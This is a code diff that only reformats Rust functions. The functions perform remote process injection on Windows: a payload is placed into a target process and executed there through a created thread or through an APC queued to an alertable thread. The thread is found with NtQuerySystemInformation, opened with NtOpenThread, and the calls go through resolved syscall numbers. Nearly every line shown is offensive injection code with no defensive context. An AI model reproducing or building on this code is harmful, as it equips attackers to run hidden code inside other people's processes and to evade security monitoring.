@@ -466,8 +466,8 @@ unsafe fn remote_inject(pid: u32, payload: &[u8]) -> Result<()> {
                 0u64,
                 h_process as u64,
                 remote_base as u64,
-                0u64,      // argument
-                0u64,      // created suspended = FALSE
+                0u64, // argument
+                0u64, // created suspended = FALSE
                 0u64,
                 0u64,
                 0u64,
@@ -521,12 +521,8 @@ unsafe fn try_apc_execution(
     )
     .ok_or_else(|| "NtQuerySystemInformation not found".to_string())?;
 
-    type NtQuerySystemInformationFn = unsafe extern "system" fn(
-        u32,
-        *mut std::ffi::c_void,
-        u32,
-        *mut u32,
-    ) -> i32;
+    type NtQuerySystemInformationFn =
+        unsafe extern "system" fn(u32, *mut std::ffi::c_void, u32, *mut u32) -> i32;
 
     let query_fn: NtQuerySystemInformationFn = std::mem::transmute(nt_query_info);
 
@@ -534,7 +530,12 @@ unsafe fn try_apc_execution(
     let mut buf: Vec<u8> = Vec::with_capacity(buf_size as usize);
     let mut ret_len = 0u32;
 
-    let status = query_fn(5, buf.as_mut_ptr() as *mut std::ffi::c_void, buf_size, &mut ret_len);
+    let status = query_fn(
+        5,
+        buf.as_mut_ptr() as *mut std::ffi::c_void,
+        buf_size,
+        &mut ret_len,
+    );
     if status < 0 && status as u32 != 0x00000105 {
         return Err(format!(
             "NtQuerySystemInformation failed: {:#010x}",
@@ -605,8 +606,8 @@ unsafe fn try_apc_execution(
         offset += next_entry as usize;
     }
 
-    let (best_tid, _score) = best_candidate
-        .ok_or_else(|| "no alertable thread found in target process".to_string())?;
+    let (best_tid, _score) =
+        best_candidate.ok_or_else(|| "no alertable thread found in target process".to_string())?;
 
     // Open the alertable thread.
     let mut cid = [0u64; 2];
@@ -629,8 +630,7 @@ unsafe fn try_apc_execution(
     if t_status < 0 || h_thread == 0 {
         return Err(format!(
             "NtOpenThread(tid={}) failed: {:#010x}",
-            best_tid,
-            t_status as u32
+            best_tid, t_status as u32
         ));
     }
 
@@ -648,10 +648,7 @@ unsafe fn try_apc_execution(
 
     match apc_status {
         Ok(s) if s >= 0 => Ok(best_tid),
-        Ok(s) => Err(format!(
-            "NtQueueApcThread failed: {:#010x}",
-            s as u32
-        )),
+        Ok(s) => Err(format!("NtQueueApcThread failed: {:#010x}", s as u32)),
         Err(e) => Err(format!("NtQueueApcThread SSN: {e}")),
     }
 }
